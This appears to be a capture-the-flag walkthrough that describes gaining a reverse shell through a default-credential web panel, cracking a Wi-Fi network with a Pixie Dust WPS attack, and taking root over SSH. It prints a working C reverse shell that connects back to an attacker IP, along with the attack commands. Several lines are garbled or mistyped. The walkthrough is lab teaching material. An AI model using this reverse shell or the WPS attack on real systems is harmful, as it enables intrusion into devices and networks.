



## ENUMERATING
In the `nmap` we get 2 port one is 8080, and 22 looking at he port 8080 is `opencl` login using default credential in the web and go to hardware then open hardware add `revershell` on the functions
```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct soc kaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.3");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"bash", NULL};
    execvp("bash", argv);

    return 0;       
}
```
use `netcat` because we got sh stable it using `bash -c` and `python` the `user.txt` is in the `root` folder why because the real root is on other device using `ifconfig` we know that we got `wlan0` using `iwlist wlan0 scanning` we know that there one device but it has encryption searching for a while again and i got https://github.com/nikita-yfh/OneShot-C
this is a pixie dust it allow us to run pixie dust attack without monitor mode compile it using `makefile` then transfer it to `netcat` after that use this script 
```bash
sudo ./onefile -i wlan0 -b {TARGET MAC} -K
```
after that we got `ssid` and password of the device using `iwctl` is not working so we use a `systemd` file configuration 
## CONNECT TO DEVICE USING systemd
first we have make file named `/etc/wpa_supplicant/wpa_supplicant-wlan0.conf` then add this
```conf
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1

network={
  ssid="<NETWORK_SSID>"
  psk="<NETWORK_PASSWORD>"
  key_mgmt=WPA-PSK
  proto=WPA2
  pairwise=CCMP TKIP
  group=CCMP TKIP
  scan_ssid=1
}
```
after that add a file called `/etc/systemd/network/25-wlan.network` add this
```network
[Match]
Name=wlan0

[Network]
DHCP=ipv4
```
then type this
```bash
systemctl enable wpa_supplicant@wlan0.service
systemctl restart systemd-networkd.services
systemctl restart wpa_supplicant@wlan0.service
```
after that type `ifconfig` in wlan0 we got `192.168.1.10` to access the device we use `ssh`
```sh
ssh 192.168.1.1
```
because the device doesn't have a password we suddenly got the root 